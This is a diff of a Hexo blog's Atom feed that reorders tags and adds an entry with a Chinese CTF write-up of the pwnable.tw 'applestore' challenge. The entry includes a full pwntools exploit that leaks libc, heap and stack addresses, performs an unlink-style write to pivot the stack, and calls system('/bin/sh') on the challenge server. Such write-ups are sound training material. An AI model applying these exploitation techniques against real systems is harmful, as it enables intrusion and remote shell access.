@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://p4nda.top/"/>
-  <updated>2018-07-01T14:36:28.058Z</updated>
+  <updated>2018-06-28T11:33:35.374Z</updated>
   <id>http://p4nda.top/</id>
   
   <author>
@@ -15,27 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title></title>
-    <link href="http://p4nda.top/2018/07/01/baidu_verify_2MmLPHd3Ob/"/>
-    <id>http://p4nda.top/2018/07/01/baidu_verify_2MmLPHd3Ob/</id>
-    <published>2018-07-01T14:36:14.357Z</published>
-    <updated>2018-07-01T14:36:28.058Z</updated>
-    
-    <content type="html"><![CDATA[2MmLPHd3Ob]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        2MmLPHd3Ob
-      
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>【PWNABLE.TW】 wannaheap 解题思路</title>
@@ -57,9 +36,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
@@ -84,9 +63,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -111,9 +90,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -136,9 +115,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -162,9 +141,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -188,9 +167,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -214,9 +193,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
     
@@ -243,9 +222,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -268,9 +247,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -346,9 +325,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -399,9 +378,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
   </entry>
   
@@ -424,9 +403,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
@@ -453,9 +432,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
@@ -481,9 +460,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
@@ -510,9 +489,9 @@
     </summary>
     
     
-      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
-    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
@@ -538,9 +517,38 @@
     </summary>
     
     
+      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
       <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
+      <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【PWNABLE.TW】 applestore 解题思路</title>
+    <link href="http://p4nda.top/2017/09/14/pwnable-tw-applestore/"/>
+    <id>http://p4nda.top/2017/09/14/pwnable-tw-applestore/</id>
+    <published>2017-09-14T07:31:00.000Z</published>
+    <updated>2018-06-28T12:07:27.024Z</updated>
+    
+    <content type="html"><![CDATA[<p>做到这道题的时候正赶上iPhone 8上市，撒花~（虽然不知道为啥）</p><p><img src="/img/applestore/1.png" alt=""></p><h1 id="题目功能"><a href="#题目功能" class="headerlink" title="题目功能"></a>题目功能</h1><p>先进到main函数，比较简单。</p><p><img src="/img/applestore/2.png" alt=""></p><p> myCart位于bss段上，是一个长度为0x10。</p><p><img src="/img/applestore/3.png" alt=""></p><p>主要的处理函数是handler函数：</p><p><img src="/img/applestore/4.png" alt=""></p><p>这是一个标准的菜单类题目。挨个函数看下去 list：</p><p><img src="/img/applestore/5.png" alt=""></p><p>这个是各种手机的价格，什么都没有。</p><p>再看第二个函数：</p><p><img src="/img/applestore/6.png" alt=""></p><p>这个函数是一个添加购物车的函数，具体采用my_read函数，得到用户输入的商品号，然后用atoi函数进行判断。</p><p>my_read函数中存在一个问题，在read部分中以\0分割可以输入其他内容到栈上，并不影响运行结果，因为atoi函数是以\0为分割的。</p><p><img src="/img/applestore/7.png" alt=""></p><p>再看create函数：</p><p><img src="/img/applestore/8.png" alt=""></p><p>先malloc了一块空间，并返回，内容先不说。然后再看insert函数，首先在myCart上寻找，找到第3个字节为0的就将上面malloc的内存挂在上面。</p><p><img src="/img/applestore/9.png" alt=""></p><p>当malloc、insert许多内存块后，大致就形成了链表。</p><p>delete函数</p><p><img src="/img/applestore/10.png" alt=""></p><p>首先还是使用my_read函数，接受用户输入，根据输入判断删除的位置，进一步将被删除的内存块从链表中摘除，摘除的操作类似于smallbins的unlink操作。</p><p>cart函数，这是一个遍历链表并打印的过程，一遍来说，内存数据泄露都出现在这样的函数中。</p><p><img src="/img/applestore/11.png" alt=""></p><p>checkout函数，这是一个结账函数，但是并不是真的结账，无论选择多少东西，函数都会告诉你下次结账吧。不过这里存在一个彩蛋，当选择商品的总价为7174时，会以1美元的价格在购物车里添加一台iPhone8.</p><p><img src="/img/applestore/12.png" alt=""></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>位置就是在上面赠送的iPhone 8处，所谓的Free is the most expensive。</p><p>之前选择的商品都使用了malloc为商品创建了一块内存，但最后这个用了栈内的一块空间，距离ebp-2c个字节。</p><p><img src="/img/applestore/13.png" alt=""></p><p>有了这点还不够，需要查看这块栈地址是否能被我们利用。</p><p>在其他函数中，距离ebp -0x20的位置都可以被用户自己修改。如，</p><p><img src="/img/applestore/14.png" alt=""></p><p><img src="/img/applestore/14-1.png" alt=""></p><p><img src="/img/applestore/14-2.png" alt=""></p><p>以上位置，再加上my_read中的bug（上文提到的），就可以修改iPhone 8 内存块的任意结构了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先是7174价格的构造，简单的方法，所有的价格都以99结尾，然后价格以4结尾，总数应该是<em>6台，所以尝试用199</em>26 + 100 * 20 = 7174。即 6台 iPhone6  + 20台 iPhone 6s可以构造。</p><p>如此可以得到第27块是栈里的一块。</p><h2 id="libc地址泄露"><a href="#libc地址泄露" class="headerlink" title="libc地址泄露"></a>libc地址泄露</h2><p>在之前说过的，cart函数一般是地址泄露重要的突破点，这个也不例外，可以看到函数逻辑中，在打印部分是顺序遍历链表，若i+8不为空，就打印下一块的i，i+4部分：</p><p><img src="/img/applestore/15.png" alt=""></p><p>前面构造的26块很正常，当第27块构造成如下结构时，即可泄露函数地址：</p><p><img src="/img/applestore/16.png" alt=""></p><p>在用户输入时，别忘了buf是从-22开始的，即前面还有两个自己，这两个字节恰好填充为 “y\0”</p><p>如此便可泄露libc地址：</p><p><img src="/img/applestore/17.png" alt=""></p><h2 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h2><p>仅仅泄露一个libc是不够的，还需要更多数据。</p><p>这个地址可以使用bss段上的myCart来泄露，因为bss端地址已知，其次myCart是链表头，具体可将内存块构造成如下这样：</p><p><img src="/img/applestore/18.png" alt=""></p><p>同样，不要忘记前面的“y\0”</p><p><img src="/img/applestore/19.png" alt=""></p><h2 id="泄露stack地址"><a href="#泄露stack地址" class="headerlink" title="泄露stack地址"></a>泄露stack地址</h2><p>上面可以得到第一块malloc得到堆的地址。一定有这样的疑惑，有了第一块堆的地址，通过计算26次malloc(0x10)就可以计算出第26块的地址，才利用上面的方法泄露，不就可以得出了第26块上 i+8的地址了吗？（栈上地址）</p><p>最开始就是这么写的，但是实际跑的时候发现并没有这样分配，没有特别多的规律，所以我采用了每次得到下一块堆块的地址，然后泄露其i+8内容，不断迭代得到最后的栈地址。</p><p><img src="/img/applestore/20.png" alt=""></p><p>以上就得到了全部的地址。如果有人知道为啥堆分配不是顺次+ 0x18的请告诉我</p><p>仅仅泄露堆栈等地址貌似没什么用，必须找到可以篡改的地方。</p><h2 id="Dword-shoot"><a href="#Dword-shoot" class="headerlink" title="Dword shoot"></a><strong>Dword shoot</strong></h2><p> DWORD SHOOT是堆漏洞的一个名词，意思是可以精确覆盖一个双字节地址的漏洞，常见的就是unlink漏洞。</p><p>上面说过，删除购物车里货物的方式类似于堆的unlink，因此存在的漏洞也类似于unlink的漏洞。</p><p>当我们修改第27块iPhone 8的后8字节时，对其进行删除就会有个DWORD SHOOT漏洞。</p><p>该漏洞如何利用呢？</p><p>覆写一般的地址会有一个四字节的副作用产生，因此常见的利用方法是覆盖下两层函数的ebp，进一步控制esp，控制eip。</p><p>详细的原理可以参考之前我写的一篇关于pwnable.kr中的unlink题目：<a href="http://www.cnblogs.com/p4nda/p/7172104.html" target="_blank" rel="noopener"> http://www.cnblogs.com/p4nda/p/7172104.html</a></p><p>利用思路是覆盖ebp，控制esp，控制eip，可参看这一篇：<a href="http://www.cnblogs.com/p4nda/p/7280520.html" target="_blank" rel="noopener">http://www.cnblogs.com/p4nda/p/7280520.html</a></p><p>第27块堆块的内容如下：</p><p><img src="/img/applestore/21.png" alt=""></p><p>这次前面两位填写“27”</p><p>关键就在于如何构造stack_addr地址，必须找到一块我们可以覆写的内存，且在main函数结束之前不被破坏。这里我选择的在handler函数中的nptr块，</p><p><img src="/img/applestore/22.png" alt=""></p><p>将其构造为：</p><p><img src="/img/applestore/23.png" alt=""></p><p>由于会在main函数退出时执行system(‘/bin/sh’)，因此前两位填写“6\0”,使函数退出。</p><p>在这里还踩过一个坑在于使用子函数如cart内的nptr作为fake steak，但是不可以，有耐心的可以自行调一下为啥~</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./applestore'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./applestore'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line">    <span class="comment">#off = 0x001b2000</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10104</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    <span class="comment">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Device Number&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Device Number&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'iPhone 8'</span> <span class="keyword">in</span> p.recvuntil(<span class="string">'&gt;'</span>):</span><br><span class="line">log.success(<span class="string">'got iPhone 8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leaklibc</span></span><br><span class="line">num = <span class="string">'y\0'</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">price = <span class="number">0</span></span><br><span class="line">next_phone = <span class="number">0</span></span><br><span class="line">last_phone = <span class="number">0xdeadbeef</span></span><br><span class="line">leak = <span class="string">'y'</span></span><br><span class="line">leak = flat(num,read_got,price,next_phone,last_phone)</span><br><span class="line"><span class="keyword">print</span> len(leak),<span class="string">' : '</span>, leak</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt;'</span>)</span><br><span class="line">p.sendline(leak)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line"></span><br><span class="line">read_libc_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">if</span> read_libc_addr &gt; <span class="number">0xf7000000</span>:</span><br><span class="line">log.success(<span class="string">'got read addr:'</span>+hex(read_libc_addr))</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_libc = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">read_libc   = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">system_libc_addr = system_libc + read_libc_addr - read_libc</span><br><span class="line">bin_sh_libc_addr = bin_sh_libc + read_libc_addr - read_libc</span><br><span class="line"><span class="comment">#leakheap</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048b03')</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">num = <span class="string">'y\0'</span></span><br><span class="line">read_got = <span class="number">0x804b070</span></span><br><span class="line">price = <span class="number">0</span></span><br><span class="line">next_phone = <span class="number">0</span></span><br><span class="line">last_phone = <span class="number">0xdeadbeef</span></span><br><span class="line">leak = <span class="string">'y'</span></span><br><span class="line">leak = flat(num,read_got,price,next_phone,last_phone)</span><br><span class="line"><span class="keyword">print</span> len(leak),<span class="string">' : '</span>, leak</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt;'</span>)</span><br><span class="line">p.sendline(leak)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]heap: '</span>,hex(heap_addr)</span><br><span class="line"><span class="comment">#leak_stack</span></span><br><span class="line">stack_p = log.progress(<span class="string">'pass'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">num = <span class="string">'y\0'</span></span><br><span class="line">read_got = heap_addr+<span class="number">8</span></span><br><span class="line">price = <span class="number">0</span></span><br><span class="line">next_phone = <span class="number">0</span></span><br><span class="line">last_phone = <span class="number">0xdeadbeef</span></span><br><span class="line">leak = <span class="string">'y'</span></span><br><span class="line">leak = flat(num,read_got,price,next_phone,last_phone)</span><br><span class="line"><span class="keyword">print</span> len(leak),<span class="string">' : '</span>, leak</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt;'</span>)</span><br><span class="line">p.sendline(leak)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack: '</span>,hex(heap_addr)</span><br><span class="line">stack_p.status(<span class="string">'stack'</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_addr = heap_addr</span><br><span class="line">p.success(<span class="string">'find stack addr:'</span>+hex(stack_addr))</span><br><span class="line"><span class="comment">#dword shoot</span></span><br><span class="line">ebp_addr = stack_addr + <span class="number">0x20</span> + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">'27'</span></span><br><span class="line"></span><br><span class="line">dword_shoot_exp = flat(num,<span class="number">0</span>,<span class="number">0</span>,stack_addr+<span class="number">64</span>,ebp_addr<span class="number">-8</span>)</span><br><span class="line"><span class="keyword">print</span> len(dword_shoot_exp),<span class="string">":"</span>,dword_shoot_exp</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number&gt;'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(dword_shoot_exp)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#put system into stack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil('&gt;')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="string">'6\0'</span></span><br><span class="line">esp = <span class="number">0xdeadbeef</span></span><br><span class="line">exp = flat(num,esp,system_libc_addr,esp,bin_sh_libc_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(exp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;做到这道题的时候正赶上iPhone 8上市，撒花~（虽然不知道为啥）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/img/applestore/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h1 id=&quot;题目功能&quot;&gt;&lt;a href=&quot;#题目功能&quot; class=&quot;headerlink&quot; t
+      
+    
+    </summary>
+    
+    
       <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
+    
+      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
     
       <category term="PWNABLE.TW" scheme="http://p4nda.top/tags/PWNABLE-TW/"/>
     
